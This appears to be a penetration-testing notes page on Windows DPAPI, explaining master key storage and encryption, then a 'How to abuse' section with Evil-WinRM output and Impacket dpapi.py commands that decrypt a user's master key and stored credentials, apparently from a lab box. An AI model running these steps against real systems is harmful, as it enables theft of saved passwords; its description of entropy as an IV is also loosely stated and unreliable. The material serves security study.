---
description: The DPAPI (Data Protection API) is an internal component in the Windows system
---

# DPAPI

DPAPI stands for "Data Protection Application Programming Interface". DPAPI is a cryptographic interface that has been available since Windows 2000. It's important to note that DPAPI itself does not store any data. The sole function of DPAPI is to take plaintext input and convert it into ciphertext.

Among the personal data protected by DPAPI are:

* Internet Explorer and Google Chrome's passwords and auto-completion data
* Email and internal FTP accounts
* Passwords for shared folders, resources, wifi and Windows Vault
* Passwords for RDP
* Network passwords managed by Credential Manager.

### <mark style="color:yellow;">How does it work</mark>

DPAPi is a system thats helps securly store and protect sensitive information as such as passwords, cryptographic keys and other secrets.

#### Key management

DPAPI uses symmetric keys, or just 1 key instead of a keypair which is assymetric. This is derived from user credentials or domain secrets or logon credentials.

#### Where are DPAPI keys store?

The master keys is stored in the following locatin. It uses the SID of a user which containts the keys needed to decrypt data for that user.&#x20;

```powershell
# Master keys
%APPDATA%\Microsoft\Protect\{SID}

# Crome, RDP, Certs
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Protect

# more
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

#### Decryption

The master key protects encryption keys, a symmetric key is derived from user's login credentials to unlock the master key.

#### **Entropy and Initializing Vector (IV)**

* **Entropy** is an optional additional key that can be used during the encryption process.
* It acts as an **Initializing Vector (IV)**, a random value added to the first block of encrypted data.

Adding entropy increases security by ensuring that only the specific user or application with the correct extra key can decrypt the data.

> **Key Point**: Without the correct IV (or entropy), the first block of data cannot be decrypted, which makes decrypting the entire dataset impossible.

#### Process

1. DPAPI generates user key based on password&#x20;
2. DPAPI generates random master key and encrypts it with user key.
3. CryptProtecData is called to create session key which is derived from master key.
4. Password is ecnrypted with session key which encrypts the data.

### <mark style="color:yellow;">How to abuse</mark>

First find the keys

```powershell
*Evil-WinRM* PS C:\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> Get-ChildItem -Force
Directory: C:\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a----         12/2/2024   3:23 PM          14043 ttest.png
-a-hs-          6/7/2024   1:17 PM             24 Preferred
```

Decrypt the masterkey

```powershell
dpapi.py masterkey -file "/path/to/masterkey_file" -sid $USER_SID -password $MASTERKEY_PASSWORD

# Example
dpapi.py masterkey -file "/home/kali/99cf41a3-a552-4cf7-a8d7-aca2d6f7339b" -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
```

Then decrypt credentials using the masterkey

```powershell
dpapi.py credential -file "/home/kali/C4BB96844A5C9DD45D5B6A9859252BA6" -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
```

